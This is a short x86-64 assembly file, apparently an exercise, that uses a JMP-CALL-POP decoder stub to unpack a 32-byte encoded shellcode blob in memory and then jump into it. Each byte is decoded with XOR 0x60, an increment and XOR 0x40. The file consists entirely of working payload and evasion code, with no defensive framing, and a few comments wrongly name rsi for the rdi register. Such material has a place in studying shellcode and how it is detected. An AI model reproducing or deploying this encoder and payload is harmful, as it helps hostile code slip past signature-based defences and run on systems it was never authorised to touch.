global _start

section .text


_start:
    jmp find_address

decoder:
    ; We landed here by a call op which means the RET value will be on the stack
    ; In our case, the RET value in stack points to our shellcode in memory
    pop rdi                 ;get addr of start of shellcode
    xor rcx,rcx             ;we are about to enter a decoding loop so reset the counter
    add cl,32               ;our shellcode is 32 bytes long so lets setup the counter for that
    ;Execution will no drift into the next section (decode_loop)

decode_loop:
    ; on each iteration:
    XOR byte [rdi], 0x60    ; XOR 0x60 with byte at [rsi] addr
    inc byte[rdi]           ; Inc byte at [rsi] addr
    xor byte [rdi], 0x40    ; XOR 0x40 with byte at [rsi] addr
    inc rdi                 ; Move RSI addr to next byte for the next loop
    loop decode_loop        ; loop
    jmp encoded_shellcode   ; Once loop is done for all bytes, jmp to the (now) decoded shellcode


find_address:
    call decoder
    encoded_shellcode: db 0x67,0x10,0x1f,0x6f,0x68,0x9e,0xe,0x41,0x48,0x4d,0xe,0xe,0x52,0x47,0x60,0x76,0x67,0xa8,0xc6,0x6f,0x76,0x67,0xa8,0xc5,0x67,0xac,0x76,0x27,0x8f,0x1a,0x2e,0x24
